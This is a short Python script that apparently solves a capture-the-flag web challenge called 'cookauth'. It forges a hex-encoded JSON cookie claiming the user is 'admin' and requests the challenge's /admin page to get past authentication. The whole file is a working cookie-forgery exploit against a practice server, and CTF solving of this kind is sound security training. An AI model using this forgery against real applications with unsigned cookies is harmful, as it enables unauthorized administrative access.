import requests
from binascii import hexlify

URL = 'http://cookauth.chal.ctf.gdgalgiers.com/admin'

payload = '{"user": "admin"}'

resp = requests.get(url = URL, cookies = { '_info_user': hexlify(payload.encode()).decode() })
print(resp.text)
